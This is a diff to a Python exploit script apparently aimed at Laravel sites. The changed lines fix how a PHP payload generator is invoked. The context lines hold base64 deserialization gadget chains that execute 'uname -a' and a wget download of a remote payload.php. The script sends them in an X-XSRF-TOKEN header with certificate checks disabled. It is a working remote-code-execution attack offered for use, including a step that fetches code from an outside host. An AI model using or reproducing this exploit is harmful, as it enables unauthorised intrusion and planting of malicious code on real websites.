@@ -65,8 +65,8 @@ def exploit(site):
             key = key
           pay1 = "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIqZXZlbnRzIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6Iipmb3JtYXR0ZXJzIjthOjE6e3M6ODoiZGlzcGF0Y2giO3M6NjoiYXNzZXJ0Ijt9fXM6ODoiKmV2ZW50IjtzOjIxOiJ1bmFtZSAtYTtlY2hvIENvbjdleHQiO30="
           pay2 = "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIqZXZlbnRzIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6Iipmb3JtYXR0ZXJzIjthOjE6e3M6ODoiZGlzcGF0Y2giO3M6NjoiYXNzZXJ0Ijt9fXM6ODoiKmV2ZW50IjtzOjcxOiJ3Z2V0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmMKb20vcmludG9kL3Rvb2xvbC9tYXN0ZXIvcGF5bG9hZC5waHAiO30="
-          gen = check_output(["bjir/gen.php", key,  pay1])
-          gen2 = check_output(["bjir/gen.php", key, pay2])
+          gen = check_output(["php", "bjir/gen.php", key,  pay1])
+          gen2 = check_output(["php", "bjir/gen.php", key, pay2])
           code = re.findall("##(.*?)##", gen)[0]
           code2 = re.findall("##(.*?)##", gen2)[0]
           njir = tod.post(site, headers={"X-XSRF-TOKEN": code}, verify=False)
